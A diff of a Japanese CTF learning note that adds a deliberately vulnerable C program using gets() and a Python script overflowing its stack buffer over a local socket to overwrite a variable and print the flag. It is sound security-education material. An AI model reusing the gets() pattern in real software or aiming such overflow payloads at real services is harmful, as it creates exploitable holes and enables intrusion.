@@ -5,6 +5,7 @@
 # pwn_server.py
 
 接続が来たら標準入出力を持つプログラムにプロセスを受け渡すプログラム。
+標準入力に脆弱性を仕掛けておけばよいので楽
 
 # 最も単純なPWN
 
@@ -140,11 +141,76 @@ saru@lucifen:~/pwn001$
 
 良く分からないのでとりあえずprintfでsecretの書き換えが成功している状態のものをexploit codeで書き換えるのを試してみることにする。
 
+いろいろ試していたところ、どうやら改行コードを送るタイミングでstackdumpを起こしてしまいうまくsecretだけ書き換えることができない。
 
+ので脆弱性を持っているコードを若干修正。
+
+```c:overflow01.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+void saru(){
+  char buf[16];
+  int dummy = 0x1234;
+  int secret = 0;
+
+
+  gets(buf);
+
+  if (secret == 0xaabbccdd){
+    puts("flag is HANDAI_CTF");
+  }else{
+    printf("buf[] = %s\n", buf);
+    printf("The secret is %x\n", secret);
+  }
+}
+
+int main(int argc, char **argv){
+  saru();
+
+  return 0;
+}
+```
+
+そしてexploitコード。
+
+```python:exploit01.py
+import socket
+import time
+
+
+
+def main():
+    buf = 'A' * 24
+    buf = buf.encode()
+    buf += b'\xdd\xcc\xbb\xaa'
+    buf += '\n'.encode() 
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect(("localhost", 28080))
+    time.sleep(1)
+    print(buf)
+    sock.sendall(buf)
+    s = sock.recv(100)
+    print(s.decode(errors='replace'))
+
+
+
+if __name__ == "__main__":
+    main()
+```
+
+うまくflagが取れた。
+
+```bash-session
+saru@lucifen:~/pwn001$ python exploit01.py
+b'AAAAAAAAAAAAAAAAAAAAAAAA\xdd\xcc\xbb\xaa\n'
+flag is HANDAI_CTF
+
+saru@lucifen:~/pwn001$
+```
 
 
 # 参考サイト
 
 [PWN入門](https://gist.github.com/matsubara0507/72dc50c89200a09f7c61)
-
-
